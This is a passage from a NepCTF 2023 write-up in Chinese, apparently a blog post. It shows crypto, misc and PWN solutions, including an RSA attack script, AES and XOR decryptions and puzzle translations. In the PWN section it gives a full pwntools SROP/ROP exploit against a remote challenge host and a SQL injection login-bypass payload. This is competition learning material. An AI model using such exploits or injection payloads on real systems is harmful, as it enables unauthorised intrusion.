#     m = f.readline()
#     N.append(int(f.readline().replace("\n", "")))
#     e.append(int(f.readline().replace("\n", "")))
# print(e)
N = [8797850762527448875711677767020267414950188153161304084832876668598086772233001561698918976784198342454554370940536047153212058794719542235625702687239362849126656874613990149193027279522559247596044678069008014435677475356364279484123571294022908697098941170235127058367562338748488152059184472259418794252127225198563128216677436454484246418206072739139464389798954591627279495270943383687656061640920843925976494700048887628779474283120534608746835005809897804260602471855367836336558301185160294854135318364202761719337662694069575022227399011478465555447473115023808273657946585434738210801514112060541284618393, 10038439328181348277455376467824354954092573882426151141413010377935088118248334225905897871893410903258360225230186354132414689730237736924323403850797854534196155066596954336349645941857585605029735333030656580826182968475277511326440697448684839256713338670071756666705870440203910254473991369982237307785670836921669526890638021720024676256403514863114716472640202063867975152349450004347656749345903039090677717514662565028996759129809848139167705867507560491909270111034295630845341493786394061996074503472573030720785526248385734678032443825555698508122190171658483226673657040375975913880265811726205581059147, 1927717471208759784994824041051582230285824484249123307165742473095185634713586535003830852335176965184386710385562759323709775335469724535832689168066861014719806445429368420906215143001648669424021939394585195369577216586646974432921629249276801190041858750488211518111672335500984308108372911812604599314510113847284306529342176426231451190164423327992686552687624612785966465596658798589703138279611061196359484562989006254489198582022257304668601970724969697945415472873587313500432934295345792258082847922276049009252421100376445943978456691305648027495987925481164069131879795025036074314824080003312457626541, 77528653010284944983696081129067425839140309986300316765964408728526434629194332889049508842668263520473119399947063754621917723368866836802964734677919990757548756828494241227024344360245774768430371076149240674076124069421527957053142413370170426513760255352632380829325880745506562735329295881347171568748072169712010233129767545195275031344677817912598184314754427455637960587708232949731957945082323286859546575185434793007756410138119769831057792868059988501680866850271048110737346487210790967354667127128163245804131977137826515620459008706886421596272650087798133720704429500971272712245819582498249917779, 2350749000945474111771131272006142945937437914121343317392611216100449280603980220005546372842695219101643592303785853532996478871838367757280398826361078223551970655120721081435113179927784245890117948349648588719646353084466139662472124442550742651101926683153717710564984357185797006677743963825643214784245707329653934546400618351498799090854992974797915167843907532159843185110794692136199558948233920558118510431931949956741076598663602259337864799037984119317985930119377574473628788025987216183973600709590867072284442474326604924465833514487234200101509454736967874832805658212436454421889149721245453921251, 151000475828984871482027881657426912566037572815843613830290016027923367400425007808751226463646142964579163707358633174141751351761506530603152122212762893522585294755880564810340472764446524331822936874711406613318174179472063694866863130911712751029337877462234777338959728843227811303408378168785463393311453817130255547631483417924229275619705461218660487733745964148126409272641379303389084493234638305952774080836962120630987548740554725255727643781832012856406460932860982554520127633864424747106724613425692690669849923057605364409738425120645220390740037330293061493121412885983352648940113898346704551763, 4072789635992221252366753400265152968540279404582695918451633867043496422987383092699056499784164636204563724068328308288705786294177474592905219504528941804243951601112084910666731729049061114272989490424225615830375098398888910884560960473989494659591978243388159102650214597626193695615606567303387287051860164158926141785160284740574787914291616972032614250846206805467296137330863436513375965857955714517694843653116092611590944281647783344756663361217459866592015398792139458361241521587926600079403420336766872141446963378166804440306858722755858647468601759949168697941377293823756852700905579489613941330401]
e = [62135925531854349567541464457157510728999659445506359025835425178816308644513438958429620739677673531082813353602902380560532233729953186730709456262150426081411797050337785515252267859994661614380129416594166988429499491110286964173737672395699909630434305769212257854290848331856450625430865714262548926660538453951138235656040703347629977073338203431858042040648187430431553967464702448547417458012391891191242331168827516542879948925736627632321095493822141798261029795563020960949440470852487726454983604777024946653516688511628581094434070313161148363091864801587932130131222114058756663737018594845029100610870100981772922719932501897107986436384553924580696054983243999525735543904677932683557787094544920092902344245490851999001894403739443192767809108853176149674625902251491507418698600952398971432916945719740607356567766352811446399855242480803916096308801281366905201081653539982742300310493108147163668074975472416965463427143017353722938673374387413701688276314458709813152037581386235583019330128990622735228949931913797416544873823740346398308931434255971685778245882836209417673306780178675125718872280898768175088575983734438147485798271689105310514589999041150590116285761955078022709524743869882636169444321451, 39414431128629466612542783047207307661146037253252693778084704835563691951987399462193887798952870397356781323847460459312164758655683681738787926835537631873138305869527698547574947711455124813421455989240957754634645720616269034126093419601306450852464963622649559013956802363490229757584005193937037071164579022207131275670150921336315659703806725732382794565483978900790263438437828257370595900953232622649348171883808867689956958813930578956664016908271995727289990684314995994570036235761669651592169757027900025256547476177230487911191715670886289192827726151618713226245451107810559025294299357562992225087725292827167194739152233488584551196607812117898769846142546819881769958585254151983425925548068059563690474920703404149816847969793224781731964076774477161461706741173300206355026167844460918864925466658113993600185030587581034136656975322179705250574890772370721670114550477296094578693235068914701461400542318462832969736258143099677105110857780040373778332957999518631818600626464368717872068093170517836714076864359732464540748251643649829617097042699134775752231535023324501498197546626180849412392627171681819967078820884787528516753552724789535531683019313067232546488548638281612111163083526085836810238150043, 420353037025161238627553075133440132436425858208542519994676369442148377940113272918619400610751758234806111516301807990401494023870572919989508451002211560487147032049182587287495292288855983145713206187147329153825641904312914011319543324632863336738715542555376426923960180146487149086822405922078334334568729330002944972414244326267867091935048856515835877412536651371380854800538495297708158753520839232494874080532110069400718595794670816016565023629475180223160000502830531156797138453424701815454206837667871595212766400608761683966578587336783730111922790675537326071401529291365698144801070632841654623311961955001654471507984494941657265023603127102609263334415722800853721463148884180952161280913153182307403993317034498255741266152491737218314660200234017447635791002746856371928509727258260246508024734824765882257996821551098375095705955303156016794538187843666372567979988665758269259530704014615418026266006205660753958401008803714864882696575562711931524113806960702091928100131812328387178933476733136736196836167097040433737018842436409913490812832751703137945318590834175685900721641585552819311658299431507626598826518600223943967941757277208955339125380321457297908243985945990297282835934414777823161858103, 96340856679521099680399381029285179373079341679890011855277803652410835369151902332831429860242329413921764788586201449170382183573644159151551478412563870295499238279232279844610996295623469233820994472906790180496154595262692398602202483199590814031625838488577611239983249989666159373583107121905408361690416973743768332464716212553415964090325335528651151212525587260268165692216736961468559066053565892217550089424810922535811310214416819173662437182522622287096978422876290851805653794238785766757740685556802723262327161771062312156798943184828082950879718234494740654604152654464074125837193142410747887176873650619270693570605695099625047742526144509153080820585643921173029394324617819607229088329801521744790378100064566003426952397341343558942880949627331327766257007084974732077363361442518115663644798073648941752482204337720022589312577874870773990109706313893233256092220250934767448387202369643107116348202053318650954262682017256870296625197151766813972951668385527071712068349242237629323573707225466578548762022142434227043986402301857035096780573199918594229754109832268705097475677929764667386158831687725638122311068505600716030792458083668066993518088446866221294986491412592730004389294906672622183547, 2468577620953873788831301886089732289671675986323897848817680564975055516269667766838306997392041231845422049867402739476014962069389096568229267981501104119024628355529213410317728822273542676430337737581353212981459681938776579283800790598573813490647107204475212005165345029173827642534941526304691240488227637053542036768326691356551176269569775484999090387047322379852738377540278407648791446696678962859863883369218448933835838513137455503802160284307201429751024623347745843745649213709158043869084250379419262909625727553852956363221679012545875673258317922164328455039502577153146989020461918686714863982389170878644762730468375521477035878326083478978457157148796997465883729534134790906748083898789113790407760341337685796401764503315947952761324202388820903777548109697530056623611650711865107243387141480272765274408556930619769255573190323292202826704385565025428843945703669206395180207488291114830066729430744854393996980092506012847640260310065973590900121111188217230959853169230905238403776637167749134174426788440317946541672921949812998948109929052203525458230445050661715498493352562324232095397366296104959046311729535190826961139768772690614833051826261321903268611834162277141660976924251204561845724179797, 5367249678645601484289376822398140663314438035616977869856902375172612740642935698411214150025231255844807871325353829481462763208560474075268191227227584141763502847034513686303184123045192320602272205101537386071307134972120483711923610334468381440810547515532515987247236401204370119624199729475148766978652504362431472612800274334605786612399927595630338424415112189378940802168094731019330192200574163309289570460484957871038119408484334255600974642835499936507096013010976598116556674095735771768427600454402319704414499228893519937442969620484803429104583269202462619326651219334619668199748933138915420645199894078128684432198102673190859257963791486000025728236495613041962284409724660193190372838472329076622569127629159825412656392864725218802889627809249364771234405745331961391232582811123447001795946387415127852409189879601626146640886152279698578315457861191319436481094761970909341581600235516092455199890562681639829311988633033672845441211808875984107653262617718830656712989232189491775173402607414221367784258835590997400751126438897564500400751157261566562648860114240527201633745200721874217416072260946740421063453551795867288566341490594720306576974363545794545617509969132306750842622475796103064679083, 5934462997721628180078696655020214149233349289345124710841392757700042849007506426399706581457286434045720680762166139244254769056060272832638703809959098428029410511312621297095151145505860598508141799271082110941698332764019271062731155251065863327914800485131282731040001224593739523218625419220092108708953522533869491057061517920809277207908173800999668995050639302454758577979073415245535642853002183175598142716630517533145210629341612896376551129858098699542916281031058481581401616559261894995390731858809051377365893989542761917479376641124844047586047125148885256007282201944893865162893229638328305782645927798942857930712482157354886872219088027582528622886757816178255087194649069066699996604032815429772751598384104395422804420582648787830187205611197494163262735541500452091469510308025515327752878191449917437920651754771538114011125514021061301802434122284802937853925509268983017565735655221555727157361211948652555729970995359913510882666071639006719468746290516614587445384652180147034451140381399679846553491473329440309184598856422454781492649384908752445203783265807020592361440851158124884373554275342169235580137958729176000558422635692805449376084384493834774458569298304777840414145040528746630299465423]
c = b"\x02\x00\x035\x06\xe2\xb2\x7f\xe5\t\xdf\\\xb9\xb8\xa8\xac]\xef\xdeGz2E\xdb\xf0\xf0d\xaa\xe3\x90u\xe3-K\x06Q\x894\xa2\xd81'\xac\xbc\xfci\xb7vX\x1c\xfc\xe6\xc7\xc8\xf2vj\xffc\xd4A\x98\xf4s\xc6\xe6&mlmx\xa1\xdb\xe1\xb0B\xeeo\xf08\xa2x\xf5\x8c\x02F\xbbHGh\x14\x1d\xab\x1a\x97\x93\xa2\xd6N\x1d\x1d\xe8*\x9f\xe4\\B\x0b;\x03\xef\xa3h\x05\x06\xec\xf6v\xde\xb8\xd0\xef\xda\x1a\xbd\xee\x81Y\xc7 \xd6\xc3\xae\xe1\xcb-\x02\xbfc~n\xf9j\x8d\xddk;~\x90\x17\xd82\xbe\x98T\x0cO/\xecw\x85e\x1d+\xfc\x0emu-S\xd4\xc921\xacw\xe4V\xdd\xce\x879\x1d\xfc\x87_`{l\x88X\xbfC\n\xf2\xecw\xb6\xd9\xb3\x0b$\x88c_vX\x13\x93{'\xea\x96g\xa4{\x08\x03\xe0=g\xb6\xf9c}\x1f9\xe2\t\x13\x13@M\xea\xc9_\xeaM\x94\xaf\xde\xdd\xd54\xd2\xfc\x07\xf1\xd1@\xb7\xe1\x9b}\xe0\xb7"

# # 维纳攻击求出d
# def transform(x, y):  # 使用辗转相处将分数 x/y 转为连分数的形式
#     res = []
#     while y:
#         res.append(x // y)
#         x, y = y, x % y
#     return res

# def continued_fraction(sub_res):
#     numerator, denominator = 1, 0
#     for i in sub_res[::-1]:  # 从sublist的后面往前循环
#         denominator, numerator = numerator, i * numerator + denominator
#     return denominator, numerator  # 得到渐进分数的分母和分子，并返回

# # 求解每个渐进分数
# def sub_fraction(x, y):
#     res = transform(x, y)
#     res = list(map(continued_fraction, (res[0:i] for i in range(1, len(res)))))  # 将连分数的结果逐一截取以求渐进分数
#     return res

# def get_pq(a, b, c):  # 由p+q和pq的值通过维达定理来求解p和q
#     par = gmpy2.isqrt(b * b - 4 * a * c)  # 由上述可得，开根号一定是整数，因为有解
#     x1, x2 = (-b + par) // (2 * a), (-b - par) // (2 * a)
#     return x1, x2

# def wienerAttack(e, n):
#     for (d, k) in sub_fraction(e, n):  # 用一个for循环来注意试探e/n的连续函数的渐进分数，直到找到一个满足条件的渐进分数
#         if k == 0:  # 可能会出现连分数的第一个为0的情况，排除
#             continue
#         if (e * d - 1) % k != 0:  # ed=1 (mod φ(n)) 因此如果找到了d的话，(ed-1)会整除φ(n),也就是存在k使得(e*d-1)//k=φ(n)
#             continue

#         phi = (e * d - 1) // k  # 这个结果就是 φ(n)
#         px, qy = get_pq(1, n - phi + 1, n)
#         if px * qy == n:
#             p, q = abs(int(px)), abs(int(qy))  # 可能会得到两个负数，负负得正未尝不会出现
#             d = gmpy2.invert(e, (p - 1) * (q - 1))  # 求ed=1 (mod  φ(n))的结果，也就是e关于 φ(n)的乘法逆元d
#             return d
#     print("该方法不适用")

# d = []
# for i in range(7):
#     n1 = N[i]
#     e1 = e[i]
#     d1 = wienerAttack(e1, n1*n1)
#     d.append(d1)
# print(d)
d = [mpz(12478636754262584875714402813785935381703692034913368819662747926381983287030454860415821658582608015076476113522362203650457532280846698731443065733467164912590756042915952284152369671704483745169572916093710865957709352142970714537141923618160571870998317365146678024652338760379593840547147546691), mpz(23686274071756584281281807563388086490643341994627149883819049467156195938414765352685066006835491596086155149501479259930870219968366990760665504269584648197358306029658434541125578409986601900517646756401965391345776379531925704073937713514857856456779922155673360092385649884061061994435393356947), mpz(31781082783636099987448338768370700891304625270941924798677820291433268614382757840484197434880685854455913743145213514234116891556561320107838875875619847165814531052668523923579930102602387423618169169761409663775487386896068927652232173720658940475678459596255896536354911497161221799501839204487), mpz(1759705311888599121762237683674602601562650019215281100524297889958864098890456808890567814946281864858777143847204033988242078715345997577387282150134991846644101889785033783723962236449982717217935056824299870198862681740351400132360278327629947500319487627494525224941987142794473777953354286259), mpz(4745038347896076947673271938461385318794079766359529504976524646896294868332047751089985870725130328002355874927653753023531920178028251634001134203131121394768936024369661969049291674944945068481964620881625571330581475029752830170375799087480677816070627536124277872889134518120471673961875243133), mpz(11038122233753291943671884140754316997316569324294307752770057002670866443971599721095354697989126123957462677312559907063896358298435338268616203070722948799041132297418328068593545914067297819523408376155165079007564357377831753506450057285716167692167943137018723740926059682996095072469923135747), mpz(32167409752229959730450516334251032219525613651221452545810628137013019074856611786859747245276852892390695097435257804939343197003368183350732726108474784920872062856352989555612009356708498404069832839408964507375467974299535891360377321099310624341474795506125064074646641475877373055372149915887)]


# # 求p和q
# def divide_pq(e, d, n):
#     k = e*d - 1
#     while True:
#         g = randint(2, n-1)
#         t = k
#         while True:
#             if t % 2 != 0:
#                 break
#             t //= 2
#             x = pow(g, t, n)
#             if x > 1 and gmpy2.gcd(x-1, n) > 1:
#                 p = gmpy2.gcd(x-1, n)
#                 return (p, n//p)

# p = []
# q = []
# for i in range(7):
#     p1, q1 = divide_pq(e[i], d[i], N[i])
#     if p1>q1:
#         p.append(p1)
#         q.append(q1)
#     else:
#         p.append(q1)
#         q.append(p1)
# print(q)
p = [mpz(140355873796694909576431368874747339716301577234207192107779910045180090775820104686212432122292759964501347042349813301102243869077809148734909053298280796801907415519833043345228842785278399224087738271827349964000804168656623756169777278420160336931932476969311660479486045324099781333314965811813578441579), mpz(102212700979895510648623555577023610343644858959390802474003737860443963874892700208480174819660422583260196988057411912829301448776738644713817224989060861390307267204321995745224174824955195487251717187109167284400424778883589047586284499614791123748564578480091206236116565301422341513241598776475318747887), mpz(88989134949168404891168460329276009358034218952518202630480219080345007117326874396070053925826874519266118649702946670000368708749767080333383599537822438831858755527000016586892456793416386990311711539597584582871258141176880718936728664803607811403479024642917211873268923282927720764642522527655740309693), mpz(17086801723189843104884738808293129261528620712802079055076000994113691145662556838106922657376532601557062463278181051840750401595764731335811547940186263905922788548639633859399061010012617671977290161330249975225253723745726161023714094418766302279513372835527091020329450356093480371459439315300082778523), mpz(137457475866518792791178005431551103959617632938207923781080925963780520574551227868483481292949306056035420184880346674082378788818946173194579648901048347218278346295019211137588959832185168338941079193346320111722638145999101523537812944201745207699426710612151520590600645330025117084877140503961402343531), mpz(31629809179435885325000301466637904123821239728370267403120049060600199791165159929844336211467567875500257503733738038891664780702125202435606696853347849462601880425374169201338727807366915200032331813846449468332717403998836477651440754410069352816017276179194882323661619403338731942973591609663744379483), mpz(162652988860653932443281627685807699340953776193387080349470097777444222315963944629621803158832625137787268219312599555461918869427218066977627981903574394692945111392748742979374138435664675189771808930796155018579350001228249226194695654823829477623997582903571299555653901134826357542332682812187002013029)]
q = [mpz(62682455137368252114518658082028724021017753307955596332070466109739554389948087687756863609891321803711731304375789766126108919319251598444161000605397747508444667575378703848704234746059269393829577964919232275490136378181171806248272574229659248830005050558614194941189359409154597105971377703201485619467), mpz(98211271514641176929730295801784273300562909676818931678280464097365712697496181930081611267165697834838813255538768394227516512657806037800228237729351859151726301005470435354084068058706078313176420850194900021738678229235140728827605262419600253555958288223604393371899911767489704505478987788866715386981), mpz(21662391395420280166740175480830143438278106219095826236536229724954935471443049488123086205835387533188134385535238197653840886831817384892874615428592228525653862303647979302062905819635881751242094470343721349777525677271607527792252793619435665458272566816763068177360342423202997406515173279056925820337), mpz(4537341409250667993055509863597005800659859052951029179643556245743043023869180963184574829576418433699503094768535226827820107726451927086337443576427708149258611616298552623039533868319950284995290419536057599132668527014944287736389987330730893938602327550026834248972473577007180319039176540757889647273), mpz(17101645335232420362316808849341972439011670869997941027656912854636786788374521620917453084783826531982204794388878203189259315579422668809695374812348284436574617148644448673083616587188062793664827604275080576192580458858474540962299030490882035233379265033684165960007067086545922166955882246304501334121), mpz(4773992627409140467710205320463834645445609201128355807754030326688160805727857494208904266095858863231047889061591468912477771937280690199107230937236480754396064061207943851853943227091660435533307296695467311196391292339797297650862828745116360278900808609786911055625060834167547345664257043862499885161), mpz(25039746668789538711022484062672936719669039080928488880580313285977264799539589019960818824199318929448263883466562042416069902030046160446677190304557745773069254708013576963304806269489062098992927783341071012515815329120160329349552393113597692254949677199226537292525453893898882519030793322718994366669)]


# 随机数预测
def generate_private_key(bits: int):
    p, q = generate_prime(bits), generate_prime(bits)
    n, phi = p * q, lcm(p-1, q - 1)

    d = inverse_mod(0x10001, phi)
    privateKey = RSA.construct((int(n), int(0x10001), int(d), int(p), int(q)))
    return privateKey, p > q

def invert_right(m,l,val=''):
    length = 32
    mx = 0xffffffff
    if val == '':
        val = mx
    i,res = 0,0
    while i*l<length:
        mask = (mx<<(length-l)&mx)>>i*l
        tmp = m & mask
        m = m^tmp>>l&val
        res += tmp
        i += 1
    return res

def invert_left(m,l,val):
    length = 32
    mx = 0xffffffff
    i,res = 0,0
    while i*l < length:
        mask = (mx>>(length-l)&mx)<<i*l
        tmp = m & mask
        m ^= tmp<<l&val
        res |= tmp
        i += 1
    return res

def invert_temper(m):
    m = invert_right(m,18)
    m = invert_left(m,15,4022730752)
    m = invert_left(m,7,2636928640)
    m = invert_right(m,11)
    return m

def clone_mt(record):
    state = [invert_temper(i) for i in record]
    gen = random.Random()
    gen.setstate((3,tuple(state+[0]),None))
    return gen


for i in range(7):
    p[i]=  p[i] >> 32
    q[i] = q[i] >> 32
    d[i] = d[i] >> 32

prng = []
for i in range(7):
    for j in range(31):
         prng.append(int(p[i]&(0xffffffff)))
         p[i]=p[i]>>32
    for j in range(31):
        prng.append(int(q[i] & (0xffffffff)))
        q[i] = q[i] >> 32
    for j in range(30):
        prng.append(int(d[i] & (0xffffffff)))
        d[i] = d[i] >> 32

g = clone_mt(prng[:624])


# 解密
def generate_prime(bits: int):
    p = (g.getrandbits(bits - 32) << 32)
    return next_prime(p)

def generate_private_key(bits: int):
    p, q = generate_prime(bits), generate_prime(bits)
    n, phi = p * q, lcm(p-1, q - 1)
    d = inverse_mod(0x10001, phi)
    privateKey = RSA.construct((int(n), int(0x10001), int(d), int(p), int(q)))
    return privateKey, p > q

global_bits = 1024
for i in range(7):
    p, q = generate_prime(global_bits), generate_prime(global_bits)
    N = p*q
    d = generate_prime(global_bits-32)
    e = inverse_mod(d, (p * p - 1) * (q * q - 1))

privateKey, signal = generate_private_key(1024)
decipher = PKCS1_v1_5.new(privateKey)
m = decipher.decrypt(c, sentinel=None)
print(m)
# b'NepCTF{c4e4356067fb3bedc53dde7af59beb1c}'
```

## Misc

### **与AI共舞的哈夫曼**

chatgpt写个解压缩脚本

exp.py

```python
import heapq
import os
from gzip import decompress
class HuffmanNode:
    def __init__(self, char, freq):
        self.char = char
        self.freq = freq
        self.left = None
        self.right = None

    def __lt__(self, other):
        return self.freq < other.freq

def build_huffman_tree(frequencies):
    heap = [HuffmanNode(char, freq) for char, freq in frequencies.items()]
    heapq.heapify(heap)

    while len(heap) > 1:
        left = heapq.heappop(heap)
        right = heapq.heappop(heap)
        merged = HuffmanNode(None, left.freq + right.freq)
        merged.left = left
        merged.right = right
        heapq.heappush(heap, merged)

    return heap[0]

def build_huffman_codes(node, current_code, huffman_codes):
    if node is None:
        return

    if node.char is not None:
        huffman_codes[node.char] = current_code
        return

    build_huffman_codes(node.left, current_code + '0', huffman_codes)
    build_huffman_codes(node.right, current_code + '1', huffman_codes)



def decompress(input_file, output_file):
    with open(input_file, 'rb') as f:
        data = f.read()

    # 解析频率信息
    num_freq = data[0]
    frequencies = {}
    offset = 1
    for i in range(num_freq):
        byte = data[offset]
        freq = (data[offset + 1] << 24) | (data[offset + 2] << 16) | (data[offset + 3] << 8) | data[offset + 4]
        frequencies[byte] = freq
        offset += 5

    # 构建 Huffman 树
    root = build_huffman_tree(frequencies)

    # 解码压缩数据
    decoded_data = ''
    current_node = root
    for byte in data[offset:]:
        byte_bits = bin(byte)[2:].rjust(8, '0')
        for bit in byte_bits:
            if bit == '0':
                current_node = current_node.left
            else:
                current_node = current_node.right

            if current_node.char is not None:
                decoded_data += chr(current_node.char)
                current_node = root

    # 写入解压缩后的数据到输出文件
    with open(output_file, 'w', encoding='utf-8') as f:
        f.write(decoded_data)

if __name__ == "__main__":
    compressed_file = 'compressed.bin'
    decompressed_file = 'decompressed.txt'

    # 解压缩文件
    decompress(compressed_file, decompressed_file)

# Nepctf{huffman_zip_666}
```

### codes

C语言在线平台

换行`\`绕过

![img](https://raw.githubusercontent.com/githubmof/img/main/img/202309101152341.png)

### 小丁弹钢琴

音频分析前半段是摩斯密码

![img](https://raw.githubusercontent.com/githubmof/img/main/img/202309101152342.png)

```python
you should use this to  xor something
```

后半段为一串十六进制数（侧着

![img](https://raw.githubusercontent.com/githubmof/img/main/img/202309101152343.png)

```python
0x370a05303c290e045005031c2b1858473a5f052117032c39230f005d1e17
```

xor解密

![img](https://raw.githubusercontent.com/githubmof/img/main/img/202309101152344.png)

### 你也喜欢三月七么

Nepnep星球如约举办CTF大赛，消息传播至各大星球，开拓者一行人应邀而来 ———————————————————————————————————————

三月七：耶，终于来到Nepnep星球啦，让我看看正在火热进行的Hacker夺旗大赛群聊。啊！开拓者，这群名看起来怪怪的诶。 （伸出脑袋，凑近群名，轻轻的闻了一下）哇，好咸诶，开拓者你快来看看！

开拓者（U_id）：(端着下巴，磨蹭了一下，眼神若有所思）这好像需要经过啥256处理一下才能得到我们需要的关键。

三月七：那我们快想想怎么解开这个谜题！

flag格式:NepCTF{+m+}

```plain
salt_lenth= 10 
key_lenth= 16 
iv= 88219bdee9c396eca3c637c0ea436058 #原始iv转hex的值
ciphertext= b700ae6d0cc979a4401f3dd440bf9703b292b57b6a16b79ade01af58025707fbc29941105d7f50f2657cf7eac735a800ecccdfd42bf6c6ce3b00c8734bf500c819e99e074f481dbece626ccc2f6e0562a81fe84e5dd9750f5a0bb7c20460577547d3255ba636402d6db8777e0c5a429d07a821bf7f9e0186e591dfcfb3bfedfc
```

按题目描述，群名是salt（盐，所以咸），经过sha256后得到key（关键）

exp.py

```python
from Crypto.Cipher import AES
import binascii
import hashlib

iv = binascii.unhexlify("88219bdee9c396eca3c637c0ea436058")
salt = b"NepCTF2023"
ciphertext = "b700ae6d0cc979a4401f3dd440bf9703b292b57b6a16b79ade01af58025707fbc29941105d7f50f2657cf7eac735a800ecccdfd42bf6c6ce3b00c8734bf500c819e99e074f481dbece626ccc2f6e0562a81fe84e5dd9750f5a0bb7c20460577547d3255ba636402d6db8777e0c5a429d07a821bf7f9e0186e591dfcfb3bfedfc"
ciphertext = binascii.unhexlify(ciphertext)
key = binascii.unhexlify(hashlib.sha256(salt).hexdigest()[:32])

t = AES.new(key, AES.MODE_CBC, iv)
m = t.decrypt(ciphertext)
print(m)
# 6148523063484d364c793970625763784c6d6c745a3352774c6d4e76625338794d44497a4c7a41334c7a49304c336c5061316858553070554c6e42755a773d3d
```

![img](https://raw.githubusercontent.com/githubmof/img/main/img/202309101152345.png)

得到一张图片的链接 https://img1.imgtp.com/2023/07/24/yOkXWSJT.png

![img](https://raw.githubusercontent.com/githubmof/img/main/img/202309101152346.png)

猜测是新铁世界内文字，wiki上找到对应翻译表

[https://starrail.huijiwiki.com/wiki/%E6%96%87%E5%AD%97%E5%AF%B9%E7%85%A7%E8%A1%A8](https://starrail.huijiwiki.com/wiki/文字对照表)

![img](https://raw.githubusercontent.com/githubmof/img/main/img/202309101152347.png)

```python
NepCTF{HRP_aIways_likes_March_7th}
# 永远喜欢三月七(。・ω・。)
```

### 陌生的语言

![img](https://raw.githubusercontent.com/githubmof/img/main/img/202309101152348.jpg)

hint:A同学的英文名为“Atsuko Kagari'”

是动漫小魔女学院里的女主（之前没看过

贴吧看世界设定，发现有个叫新月文字（下面月亮），接着找发现还有个古龙语（上面箭头）

https://tieba.baidu.com/p/4960864131?fid=7825124&pid=103320700708#103320700708

https://tieba.baidu.com/p/4945307221

[在线转换Luna语](https://ay.medyotan.ga/lunanova/index.htm) 

https://tieba.baidu.com/p/8547884830#/ 找到对应的翻译表

![img](https://raw.githubusercontent.com/githubmof/img/main/img/202309101152349.png)

后半段 HEART_IS_YOUR_MAGIC

![img](https://raw.githubusercontent.com/githubmof/img/main/img/202309101152350.png)

前半段 NEPNEP_A_BELIEVING

最终 NepCTF{NEPNEP_A_BELIEVING_HEART_IS_YOUR_MAGIC}

![img](https://raw.githubusercontent.com/githubmof/img/main/img/202309101152351.png)

### ConnectedFive

万宁五子棋，率先到42就win

（nc老是掉，折磨。。。

![img](https://raw.githubusercontent.com/githubmof/img/main/img/202309101152352.png)

## PWN

### srop

exp.py

```python
from multiprocessing import process
from signal import pause
from socket import timeout
from pwn import *

context.arch='amd64'
context.os='linux'
context.log_level='debug'

choice=1
if choice==0:
        p=process('./pwn')
else:
        p=remote("nepctf.1cepeak.cn", 30518)

s         = lambda data        :p.send(data)
sl        = lambda data        :p.sendline(data)
sa        = lambda x,data      :p.sendafter(x, data)
sla       = lambda x,data      :p.sendlineafter(x, data)
r         = lambda num=4096    :p.recv(num)
rl        = lambda             :p.recvline(keepends = False)
ru        = lambda x           :p.recvuntil(x)
itr       = lambda             :p.interactive()
uu32      = lambda data        :u32(data.ljust(4,b'\x00'))
uu64      = lambda data        :u64(data.ljust(8,b'\x00'))
leak      = lambda name,addr   :log.success('{} = {}'.format(name, hex(addr)))
libc_os   = lambda x           :libc_base + x
libc_sym  = lambda x           :libc_os(libc.sym[x])

def get_sh():
    return libc_base + next(libc.search(b'/bin/sh\x00'))

def debug(cmd=''):
        gdb.attach(p,cmd)
        
elf=ELF('./pwn')
#libc=ELF('./libc-2.35.so')
#libc=ELF('./libc-2.31.so')
libc=ELF('./libc-2.27.so')
#libc=ELF('./libc.so.6')
#libc=ELF('./libc.so')

rdi=0x0000000000400813
rsi_r15=0x0000000000400811
bss=0x601500+0x30
lea=0x40078D
sys=0x400754
syscall=0x4007a8

got=0x0000000000600FE8
sys_plt=elf.plt['syscall']
#ru('welcome to NepCTF2023!\n')
r(0x30)
pl=b'a'*0x30+p64(bss)+p64(lea)
sl(pl)

frame=SigreturnFrame()
frame.rax = 0
frame.rdi = 1  # "/bin/sh\x00"
frame.rsi = 1
frame.rdx = got
frame.rcx=0x50
frame.rip = sys_plt
frame.rsp=bss-0x30+0x148
frame.rbp=bss

pl=b'./flag\x00'.ljust(0x30,b'\x00')
pl+=flat(0,rdi,15,sys_plt)+bytes(frame)+flat(lea)

sl(pl)
libc_base=uu64(r(6))-(0x7fc5f80ea520-0x7fc5f7fcf000)

leak("libc_base",libc_base)
rdx=libc_os(0x0000000000001b96)
rcx=libc_os(0x000000000010c423)

pl=b'./flag\x00'.ljust(0x30,b'\x00')
pl+=flat(0,rdi,2,rsi_r15,bss-0x30,0,rdx,0,sys_plt,rdi,0,rsi_r15,3,0,rdx,bss-0x80,rcx,0x50,sys_plt,rdi,1,rsi_r15,1,0,rdx,bss-0x80,rcx,0x50,sys_plt)
sl(pl)

itr()           
```

![img](https://raw.githubusercontent.com/githubmof/img/main/img/202309101152353.png)

### HRP-CHAT-1

![img](https://raw.githubusercontent.com/githubmof/img/main/img/202309101152354.png)

存在sql注入，拼接字符串绕过检测

```bash
Login
a
b
Login
a'or'1
=1
```

登录成功后进商店999买flag

![img](https://raw.githubusercontent.com/githubmof/img/main/img/202309101152355.png)

### HRP-CHAT-3

![img](https://raw.githubusercontent.com/githubmof/img/main/img/202309101152356.png)

![img](https://raw.githubusercontent.com/githubmof/img/main/img/202309101152357.png)

抽出H3h3QAQ，查看在Message中位置（第一个为0），战斗

![img](https://raw.githubusercontent.com/githubmof/img/main/img/202309101152358.png)

![img](https://raw.githubusercontent.com/githubmof/img/main/img/202309101152359.png)
